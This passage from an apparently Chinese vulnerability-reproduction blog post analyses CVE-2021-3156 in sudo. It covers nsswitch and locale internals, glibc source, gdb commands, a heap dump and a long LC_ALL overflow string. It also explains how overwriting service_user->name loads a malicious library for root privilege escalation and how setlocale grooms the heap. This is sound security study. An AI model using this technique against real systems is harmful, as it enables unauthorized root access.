class=\"comment\">#在/etc/protocols中搜索  网络协议</span></span><br><span class=\"line\">services:       db files       <span class=\"comment\">#在/etc/services中搜索   网络服务</span></span><br><span class=\"line\">ethers:         db files       <span class=\"comment\">#文件数目不确定，略        MAC地址   </span></span><br><span class=\"line\">rpc:            db files       <span class=\"comment\">#在/etc/rpc中搜索        远程过程调用名及调用号     </span></span><br><span class=\"line\"></span><br><span class=\"line\">netgroup:       nis            <span class=\"comment\">#在/etc/netgroup中搜索   定义网络范围组</span></span><br><span class=\"line\">                                                      （用于在执行远程安装，远程登录和远程Shell时检查权限）</span><br></pre></td></tr></table></figure>\n<p>所以poc中必定加载了nss_load_library函数</p>\n<p>说每个程序加载时都会解析nsswitch.conf文件。</p>\n<h3 id=\"locale\"><a href=\"#locale\" class=\"headerlink\" title=\"locale\"></a>locale</h3><p>在Linux中通过locale（区域设置）来设置程序运行的不同语言环境，locale由ANSI C提供支持。同时，在locale环境中，通过一组变量来代表国际化环境中的不同设置。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LC_ALL=C.UTF<span class=\"number\">-8</span>@AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br></pre></td></tr></table></figure>\n<p>解释</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">LC_COLLATE    定义该环境的排序和比较规则</span><br><span class=\"line\">LC_CTYPE      用于字符分类和字符串处理，控制所有字符的处理方式，包括字符编码，</span><br><span class=\"line\">              字符是单字节还是多字节，如何打印等。是最重要的一个环境变量。</span><br><span class=\"line\">LC_MONETARY   货币格式</span><br><span class=\"line\">LC_NUMERIC    非货币的数字显示格式</span><br><span class=\"line\">LC_TIME       时间和日期格式</span><br><span class=\"line\">LC_MESSAGES   提示信息的语言。另外还有一个LANGUAGE参数，它与LC_MESSAGES相似，</span><br><span class=\"line\">              但如果该参数一旦设置，则LC_MESSAGES参数就会失效。</span><br><span class=\"line\">              LANGUAGE参数可同时设置多种语言信息，</span><br><span class=\"line\">              如LANGUANE&#x3D;“zh_CN.GB18030:zh_CN.GB2312:zh_CN”。</span><br><span class=\"line\">LANG          LC_*的默认值，是最低级别的设置，如果LC_*没有设置，则使用该值。类似于 LC_ALL。</span><br><span class=\"line\">LC_ALL        它是一个宏，如果该值设置了，则该值会覆盖所有LC_*的设置值。注意，LANG的值不受该宏影响。</span><br><span class=\"line\"></span><br><span class=\"line\">&quot;C&quot;是系统默认的locale，&quot;POSIX&quot;是&quot;C&quot;的别名。所以当我们新安装完一个系统时，</span><br><span class=\"line\">默认的locale就是C或POSIX。“POSIX”:指定的最小环境c语言翻译称为POSIX locale。</span><br><span class=\"line\">如果不调用setlocale (), POSIX locale是默认的“C”相当于“POSIX”。</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-调试poc\"><a href=\"#4-调试poc\" class=\"headerlink\" title=\"4. 调试poc\"></a>4. 调试poc</h2><p>重点关注这个函数</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">static</span> <span class=\"keyword\">int</span></span><br><span class=\"line\">nss_load_library (service_user *ni)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (ni-&gt;library == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* This service has not yet been used.  Fetch the service</span></span><br><span class=\"line\"><span class=\"comment\">         library for it, creating a new one if need be.  If there</span></span><br><span class=\"line\"><span class=\"comment\">         is no service table from the file, this static variable</span></span><br><span class=\"line\"><span class=\"comment\">         holds the head of the service_library list made from the</span></span><br><span class=\"line\"><span class=\"comment\">         default configuration.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">static</span> name_database default_table;</span><br><span class=\"line\">      ni-&gt;library = nss_new_service (service_table ?: &amp;default_table,</span><br><span class=\"line\">                                     ni-&gt;name);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (ni-&gt;library == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (ni-&gt;library-&gt;lib_handle == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* Load the shared library.  */</span></span><br><span class=\"line\">      <span class=\"keyword\">size_t</span> shlen = (<span class=\"number\">7</span> + <span class=\"built_in\">strlen</span> (ni-&gt;name) + <span class=\"number\">3</span></span><br><span class=\"line\">                      + <span class=\"built_in\">strlen</span> (__nss_shlib_revision) + <span class=\"number\">1</span>);</span><br><span class=\"line\">      <span class=\"keyword\">int</span> saved_errno = errno;</span><br><span class=\"line\">      <span class=\"keyword\">char</span> shlib_name[shlen];</span><br><span class=\"line\">      <span class=\"comment\">/* Construct shared object name.  */</span></span><br><span class=\"line\">      __stpcpy (__stpcpy (__stpcpy (__stpcpy (shlib_name,</span><br><span class=\"line\">                                              <span class=\"string\">\"libnss_\"</span>),</span><br><span class=\"line\">                                    ni-&gt;name),</span><br><span class=\"line\">                          <span class=\"string\">\".so\"</span>),</span><br><span class=\"line\">                __nss_shlib_revision);</span><br><span class=\"line\">      ni-&gt;library-&gt;lib_handle = __libc_dlopen (shlib_name);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (ni-&gt;library-&gt;lib_handle == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"comment\">/* Failed to load the library.  */</span></span><br><span class=\"line\">          ni-&gt;library-&gt;lib_handle = (<span class=\"keyword\">void</span> *) <span class=\"number\">-1l</span>;</span><br><span class=\"line\">          __set_errno (saved_errno);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"meta-keyword\">ifdef</span> USE_NSCD</span></span><br><span class=\"line\">      <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (is_nscd)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"comment\">/* Call the init function when nscd is used.  */</span></span><br><span class=\"line\">          <span class=\"keyword\">size_t</span> initlen = (<span class=\"number\">5</span> + <span class=\"built_in\">strlen</span> (ni-&gt;name)</span><br><span class=\"line\">                            + <span class=\"built_in\">strlen</span> (<span class=\"string\">\"_init\"</span>) + <span class=\"number\">1</span>);</span><br><span class=\"line\">          <span class=\"keyword\">char</span> init_name[initlen];</span><br><span class=\"line\">          <span class=\"comment\">/* Construct the init function name.  */</span></span><br><span class=\"line\">          __stpcpy (__stpcpy (__stpcpy (init_name,</span><br><span class=\"line\">                                        <span class=\"string\">\"_nss_\"</span>),</span><br><span class=\"line\">                              ni-&gt;name),</span><br><span class=\"line\">                    <span class=\"string\">\"_init\"</span>);</span><br><span class=\"line\">          <span class=\"comment\">/* Find the optional init function.  */</span></span><br><span class=\"line\">          <span class=\"keyword\">void</span> (*ifct) (<span class=\"keyword\">void</span> (*) (<span class=\"keyword\">size_t</span>, struct traced_file *))</span><br><span class=\"line\">            = __libc_dlsym (ni-&gt;library-&gt;lib_handle, init_name);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (ifct != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"keyword\">void</span> (*cb) (<span class=\"keyword\">size_t</span>, struct traced_file *) = nscd_init_cb;</span><br><span class=\"line\"><span class=\"meta\">#  <span class=\"meta-keyword\">ifdef</span> PTR_DEMANGLE</span></span><br><span class=\"line\">              PTR_DEMANGLE (cb);</span><br><span class=\"line\"><span class=\"meta\">#  <span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">              ifct (cb);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"><span class=\"meta\"># <span class=\"meta-keyword\">endif</span></span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">endif</span></span></span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>参数结构体在nsswitch.h中定义</p>\n<p><img src=\"/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210415152757666-1618586880599.png\" alt=\"image-20210415152757666\"></p>\n<p><img src=\"/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210415152738770-1618586880599.png\" alt=\"image-20210415152738770\"></p>\n<p><strong>通过阅读nss_load_library函数实现可知：当 ni-&gt;library-&gt;lib_handle == NULL时，会通过__libc_dlopen调用 “libnss_”+ni-&gt;name+”.so”;因此我们要通过溢出覆写service_user-&gt;name，使得程序加载攻击者预先设置的恶意libc从而提权:</strong></p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gdb poc</span><br><span class=\"line\">b execve</span><br><span class=\"line\">r</span><br><span class=\"line\">b nss_load_library</span><br><span class=\"line\">c</span><br><span class=\"line\">dir &#x2F;home&#x2F;cyberangel&#x2F;Desktop&#x2F;sudo-1.8.21p2&#x2F;plugins&#x2F;sudoers</span><br><span class=\"line\">b sudoers.c:842</span><br><span class=\"line\">c</span><br></pre></td></tr></table></figure>\n<p>调试的堆</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pwndbg&gt; x/<span class=\"number\">32</span>gx to<span class=\"number\">-0x10</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e1310</span>:\t<span class=\"number\">0x0000000000000030</span>\t<span class=\"number\">0x0000000000000081</span> <span class=\"comment\">//==&gt;malloc chunk</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e1320</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e1330</span>:\t<span class=\"number\">0x73000a33352e302e</span>\t<span class=\"number\">0x666e6f632e766c6f</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e1340</span>:\t<span class=\"number\">0x6f66202938000a2e</span>\t<span class=\"number\">0x6c69617465642072</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e1350</span>:\t<span class=\"number\">0x2074756f62612073</span>\t<span class=\"number\">0x7070757320656874</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e1360</span>:\t<span class=\"number\">0x6f6d20646574726f</span>\t<span class=\"number\">0x000a666f20736564</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e1370</span>:\t<span class=\"number\">0x0000008000080000</span>\t<span class=\"number\">0xffffffff00060014</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e1380</span>:\t<span class=\"number\">0x00000249ffffffff</span>\t<span class=\"number\">0x0000000000000249</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e1390</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000041</span> <span class=\"comment\">//==&gt;control chunk</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e13a0</span>:\t<span class=\"number\">0x000055f5ae7e13e0</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e13b0</span>:\t<span class=\"number\">0x0000000100000000</span>\t<span class=\"number\">0x000055f500000001</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e13c0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e13d0</span>:\t<span class=\"number\">0x00007461706d6f63</span>\t<span class=\"number\">0x0000000000000041</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e13e0</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e13f0</span>:\t<span class=\"number\">0x0000000100000000</span>\t<span class=\"number\">0x0000000000000001</span></span><br><span class=\"line\"><span class=\"number\">0x55f5ae7e1400</span>:\t<span class=\"number\">0x0000000000000000</span>\t<span class=\"number\">0x0000000000000000</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210416163150184-1618586880599.png\" alt=\"image-20210416163150184\"></p>\n<p>覆盖完成之后ni-&gt;library==NULL，因此需要利用漏洞写入多个\\x00来达到目的。</p>\n<p>溢出后可见成功用X/P0P_SH3LLZ_ 覆写了file服务规范的name字段</p>\n<p><img src=\"/2021/04/13/CVE-2021-3156%E5%A4%8D%E7%8E%B0/image-20210416163647748-1618586880600.png\" alt=\"image-20210416163647748\"></p>\n<h1 id=\"0x08-如何利用\"><a href=\"#0x08-如何利用\" class=\"headerlink\" title=\"0x08 如何利用\"></a>0x08 如何利用</h1><h2 id=\"1-setlocale\"><a href=\"#1-setlocale\" class=\"headerlink\" title=\"1. setlocale\"></a>1. setlocale</h2><p>漏洞利用会使用 <code>setlocale</code>函数来进行堆布局。<code>_nl_global_locale</code> 是一个全局变量</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"class\"><span class=\"keyword\">struct</span> __<span class=\"title\">locale_struct</span> _<span class=\"title\">nl_global_locale</span> <span class=\"title\">attribute_hidden</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> __<span class=\"title\">locale_struct</span></span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"comment\">/* Note: LC_ALL is not a valid index into this array.  */</span></span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> __<span class=\"title\">locale_data</span> *__<span class=\"title\">locales</span>[13];</span> <span class=\"comment\">/* 13 = __LC_LAST. */</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* To increase the speed of this solution we add some special members.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">unsigned</span> short <span class=\"keyword\">int</span> *__ctype_b;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> *__ctype_tolower;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">int</span> *__ctype_toupper;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* Note: LC_ALL is not a valid index into this array.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *__names[<span class=\"number\">13</span>];</span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<p>主要关注其 <code>_names</code>成员，<code>_name</code>是一个数组，长度为13，下标值在代码中称为 <code>category</code>，不同 <code>category</code>值表示含义如下所示：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//glibc-2.31\\locale\\locale.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_CTYPE          __LC_CTYPE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_NUMERIC        __LC_NUMERIC</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_TIME           __LC_TIME</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_COLLATE        __LC_COLLATE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_MONETARY       __LC_MONETARY</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_MESSAGES       __LC_MESSAGES</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span>  LC_ALL        __LC_ALL</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_PAPER    __LC_PAPER</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_NAME        __LC_NAME</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_ADDRESS     __LC_ADDRESS</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_TELEPHONE   __LC_TELEPHONE</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_MEASUREMENT    __LC_MEASUREMENT</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> LC_IDENTIFICATION __LC_IDENTIFICATION</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//glibc-2.31\\locale\\bits\\locale.h</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_CTYPE       0</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_NUMERIC     1</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_TIME     2</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_COLLATE     3</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_MONETARY       4</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_MESSAGES       5</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_ALL      6</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_PAPER       7</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_NAME     8</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_ADDRESS     9</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_TELEPHONE     10</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_MEASUREMENT   11</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">define</span> __LC_IDENTIFICATION   12</span></span><br></pre></td></tr></table></figure>\n<p>除了 <code>LC_ALL</code>，如果其余值一样，比如都是 <code>C.UTF-8</code>，那么 <code>LC_ALL</code>的值也是 <code>C.UTF-8</code>。</p>\n<p>如果不是完全一样，那么 <code>LC_ALL</code>的值就是 <code>LC_CTYPE= ...;LC_NUMERIC=...;LC_IDENTIFICATION=....</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//glibc-2.31\\locale\\findlocale.c</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">struct</span> __<span class=\"title\">locale_data</span> *</span></span><br><span class=\"line\"><span class=\"class\">_<span class=\"title\">nl_find_locale</span> (<span class=\"title\">const</span> <span class=\"title\">char</span> *<span class=\"title\">locale_path</span>, <span class=\"title\">size_t</span> <span class=\"title\">locale_path_len</span>,</span></span><br><span class=\"line\"><span class=\"class\">     <span class=\"title\">int</span> <span class=\"title\">category</span>, <span class=\"title\">const</span> <span class=\"title\">char</span> **<span class=\"title\">name</span>)</span></span><br><span class=\"line\"><span class=\"class\">&#123;</span></span><br><span class=\"line\">  <span class=\"keyword\">int</span> mask;</span><br><span class=\"line\">  <span class=\"comment\">/* Name of the locale for this category.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *cloc_name = *name;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *language;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *modifier;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *territory;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *codeset;</span><br><span class=\"line\">  <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *normalized_codeset;</span><br><span class=\"line\">  <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">loaded_l10nfile</span> *<span class=\"title\">locale_file</span>;</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (cloc_name[<span class=\"number\">0</span>] == <span class=\"string\">'\\0'</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"comment\">/* The user decides which locale to use by setting environment</span></span><br><span class=\"line\"><span class=\"comment\">   variables.  */</span></span><br><span class=\"line\">      cloc_name = getenv (<span class=\"string\">\"LC_ALL\"</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!name_present (cloc_name))</span><br><span class=\"line\">  cloc_name = getenv (_nl_category_names_get (category));</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!name_present (cloc_name))</span><br><span class=\"line\">  cloc_name = getenv (<span class=\"string\">\"LANG\"</span>);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (!name_present (cloc_name))</span><br><span class=\"line\">  cloc_name = _nl_C_name;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<ol>\n<li><code>cloc_name</code>的值来源是先读取环境变量 <code>LC_ALL</code>，若没有再根据 <code>category</code>的值去读取对应的环境变量，<code>exp</code>代码都是通过环境变量来控制 <code>clonc_name</code>的，因此 <code>cloc_name</code>的值最初就是来源于设置的环境变量，且 <code>cloc_name</code>的值最终会拷贝到堆块，并将字符串指针存入 <code>_nl_global_locale._names</code></li>\n<li>函数 <code>_nl_find_locale</code>设置的是除 <code>LC_ALL</code>以外的其他 <code>category</code>的值，<code>LC_ALL</code>的值是由 <code>new_composite_name</code>函数确定，逻辑已在上述中说明</li>\n<li>设置 LC_ 的值是从尾部开始的，也就是 <code>category</code>的值是从 <code>12~0</code>来遍历的（跳过6，即 LC_ALL)</li>\n</ol>\n<p><code>setlocale(LC_ALL, &quot;&quot;)</code>函数主要就是会根据环境变量申请对应字符大小的堆块，并设置 <code>_nl_global_locale.__names</code>的值为该堆块指针。这里相当于存在一个 <code>malloc</code>操作。</p>\n<p><code>setlocale</code>执行顺序：</p>\n<ol>\n<li><code>setlocale(LC_ALL, &quot;&quot;)</code>，从环境变量中设置 <code>_nl_global_locale.__names</code>，此时里面包含 <code>;x=x</code>的形式的值，但不会被检测到</li>\n<li><code>saved_LC_ALL = setlocale(LC_ALL,NULL)</code>，返回 LC_ALL的值，其中包含了 <code>;x=x</code>的形式的值</li>\n<li><code>setlocale(LC_ALL,&quot;C&quot;)</code>，将 <code>_nl_global_locale.__names</code>中存储的堆区的字符串指针都释放了，值都变成了 <code>_nl_C_name</code>的地址</li>\n<li><code>setlocal(LC_ALL, saved_LC_ALL)</code>，由于 <code>saved_LC_ALL</code>中存在 <code>;x=x</code>导致直接返回，因此未修改 <code>_nl_global_locale.__names</code></li>\n<li>再次执行 <code>saved_LC_ALL = setlocale(LC_ALL, NULL)</code>，<code>saved_LC_ALL=&quot;C&quot;</code>，因此之后 <code>LC_ALL</code>的值都会是 <code>C</code>，因为后面不会再执行 <code>setlocale(LC_ALL, &quot;&quot;)</code></li>\n</ol>\n<h2 id=\"2-堆布局\"><a href=\"#2-堆布局\" class=\"headerlink\" title=\"2. 堆布局\"></a>2. 堆布局</h2><p>通过上述分析，我们已经了解到了一些基础知识，接下来就是将需要利用的 <code>service_user</code>堆块放到 <code>user_args</code>堆块后，且让两者之间相隔较近。这就是<code>exp</code>中最精妙的堆布局部分。</p>\n<p>首先进入 <code>sudo.c</code>就会执行 <code>setlocale(LC_ALL,&quot;&quot;)</code>，根据上面分析，这里是会从环境变量中获取值，从而分别申请堆块，申请堆块大小与环境变量中各个值有关。申请完成后，可以在 <code>_nl_global_locale.__names</code>中查看。</p>\n<p>随后执行 <code>setlocale(LC_ALL,NULL)</code>，会申请一个新的堆块，用于存储当前 <code>_nl_global_locale.__names</code>中的值。堆块的大小，如果 <code>_nl_global_locale.__names</code>中的值相同，则申请一个堆块，存储一次即可；如果不相同，则需要申请大堆块将不同的值都存储进去。</p>\n<p>然后执行 